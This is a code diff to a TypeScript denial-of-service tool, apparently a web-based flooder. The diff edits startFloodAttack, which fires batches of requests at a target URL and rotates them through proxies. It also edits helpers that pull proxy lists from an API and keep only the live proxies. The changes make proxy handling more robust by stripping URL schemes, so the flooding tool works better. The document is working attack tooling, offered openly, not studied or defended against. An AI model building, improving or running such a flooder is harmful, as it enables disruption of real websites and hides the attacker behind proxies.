@@ -79,33 +79,15 @@ export async function startFloodAttack(
     }
   }
 
-  let parsedProxies: URL[] = [];
+  let parsedProxies: string[] = [];
   if (proxiesString) {
     parsedProxies = proxiesString
       .split('\n')
       .map(line => line.trim())
-      .filter(line => line.length > 0)
-      .map(proxyUrlString => {
-        try {
-          // Attempt to parse, but don't fail immediately if it's not a full URL for HttpsProxyAgent
-          // HttpsProxyAgent can often handle simpler host:port strings too.
-          if (proxyUrlString.includes("://")) {
-            return new URL(proxyUrlString);
-          }
-          // For host:port or ip:port, wrap it to satisfy URL parser if needed,
-          // but HttpsProxyAgent might handle it directly.
-          // This part is tricky because HttpsProxyAgent is flexible.
-          // We'll let HttpsProxyAgent try to parse it.
-          return proxyUrlString as any; // Cast to allow string for HttpsProxyAgent
-        } catch (e) {
-          console.warn(`Invalid proxy URL format skipped during setup: ${proxyUrlString}`);
-          return null;
-        }
-      })
-      .filter(url => url !== null) as URL[]; // Filter out nulls from failed parsing
+      .filter(line => line.length > 0);
 
     if (parsedProxies.length === 0 && proxiesString.trim().length > 0) {
-        return { totalSent: 0, successful: 0, failed: 0, error: "No valid proxy URLs could be parsed for the attack. Check format (e.g., http://host:port)." };
+        return { totalSent: 0, successful: 0, failed: 0, error: "No valid proxy strings could be parsed. Check format (e.g., host:port or IP:PORT)." };
     }
   }
 
@@ -132,8 +114,7 @@ export async function startFloodAttack(
         if (parsedProxies.length > 0) {
           const proxyConfig = parsedProxies[totalSent % parsedProxies.length];
           try {
-            // HttpsProxyAgent constructor expects a string or URL object
-            const agent = new HttpsProxyAgent(proxyConfig.toString());
+            const agent = new HttpsProxyAgent(proxyConfig); 
             currentFetchOptions.agent = agent as any; 
           } catch (e) {
             console.error(`Error creating proxy agent for ${proxyConfig}:`, e);
@@ -146,7 +127,6 @@ export async function startFloodAttack(
         requestsInBatch.push(
           fetch(targetUrl, currentFetchOptions) 
             .then(response => {
-              // Consider any 2xx or 3xx as "successful" for this tool's purpose
               if (response.ok || (response.status >= 200 && response.status < 400)) {
                 successful++;
               } else {
@@ -189,7 +169,6 @@ export async function fetchProxiesFromUrl(apiUrl: string): Promise<{ proxies?: s
     return { error: "API URL cannot be empty." };
   }
   try {
-    // Basic URL validation
     new URL(apiUrl);
   } catch (e) {
     return { error: "Invalid API URL format. Please include the scheme (e.g., http:// or https://)." };
@@ -197,8 +176,8 @@ export async function fetchProxiesFromUrl(apiUrl: string): Promise<{ proxies?: s
 
   try {
     const response = await fetch(apiUrl, { 
-      signal: AbortSignal.timeout(10000), // 10 second timeout
-      headers: { 'Accept': 'text/plain' } // Prefer plain text
+      signal: AbortSignal.timeout(10000), 
+      headers: { 'Accept': 'text/plain' } 
     }); 
     if (!response.ok) {
       return { error: `API request failed with status ${response.status}: ${response.statusText}` };
@@ -207,14 +186,15 @@ export async function fetchProxiesFromUrl(apiUrl: string): Promise<{ proxies?: s
     if (!text.trim()) {
       return { error: "API returned an empty proxy list." };
     }
-    // Simple validation: check if response looks like a list of IPs or IP:Port
-    // This is a very basic check and might need to be more robust depending on proxy formats.
+    
     const lines = text.trim().split('\n');
-    if (lines.length === 0 || !lines.some(line => /^\S+:\d+$/.test(line.trim()) || /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(:\d{1,5})?$/.test(line.trim()) )) {
-        // console.warn("Fetched proxy list does not seem to contain valid IP:Port or Host:Port formats.", lines.slice(0,5));
-        // Allow it for now, can be stricter if needed.
+    const strippedLines = lines.map(line => line.trim().replace(/^(http(s)?:\/\/)/i, ''));
+    
+    // Basic validation for stripped lines
+    if (strippedLines.length === 0 || !strippedLines.some(line => /^\S+:\d+$/.test(line.trim()) || /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(:\d{1,5})?$/.test(line.trim()) )) {
+      // console.warn("Fetched proxy list, after stripping schemes, does not seem to contain valid IP:Port or Host:Port formats.", strippedLines.slice(0,5));
     }
-    return { proxies: text.trim() };
+    return { proxies: strippedLines.join('\n') };
   } catch (e: any) {
     console.error("Error fetching proxies from API:", e);
     if (e.name === 'TimeoutError') {
@@ -238,24 +218,26 @@ export async function checkProxies(proxiesString: string): Promise<{
 
   const proxyEntries = proxiesString.split('\n')
     .map(line => line.trim())
-    .filter(line => line.length > 0);
+    .filter(line => line.length > 0 && !line.startsWith("http://") && !line.startsWith("https://")); // Ensure no schemes here
 
   if (proxyEntries.length === 0) {
-    return { liveProxiesString: "", liveCount: 0, deadCount: 0, totalChecked: 0 };
+    // This could happen if all input proxies had schemes and were filtered out,
+    // or if the input was empty after trimming schemes.
+    // Consider if a more specific message is needed if initialProxiesString was not empty.
+    return { liveProxiesString: "", liveCount: 0, deadCount: 0, totalChecked: 0, error: "No proxies in the correct host:port format found to check." };
   }
 
   const liveProxiesArray: string[] = [];
   let deadCount = 0;
 
-  const checkSingleProxy = async (proxyUrl: string): Promise<boolean> => {
+  const checkSingleProxy = async (proxyUrl: string): Promise<boolean> => { // proxyUrl is host:port
     try {
       const agent = new HttpsProxyAgent(proxyUrl);
       const response = await fetch(PROXY_TEST_URL, {
         agent: agent as any,
         signal: AbortSignal.timeout(PROXY_TEST_TIMEOUT_MS),
-        redirect: 'manual', // Don't follow redirects for a simple 204 check
+        redirect: 'manual', 
       });
-      // Google's generate_204 returns 204. Other test URLs might return 200.
       return response.status === 204 || response.status === 200;
     } catch (error) {
       // console.warn(`Proxy ${proxyUrl} failed check:`, error.message);
@@ -277,8 +259,6 @@ export async function checkProxies(proxiesString: string): Promise<{
           deadCount++;
         }
       } else {
-        // Promise rejected, means checkSingleProxy itself had an unhandled error (should not happen often)
-        // or the proxy string was so malformed HttpsProxyAgent threw an error.
         deadCount++;
       }
     });
@@ -291,3 +271,4 @@ export async function checkProxies(proxiesString: string): Promise<{
     totalChecked: proxyEntries.length,
   };
 }
+
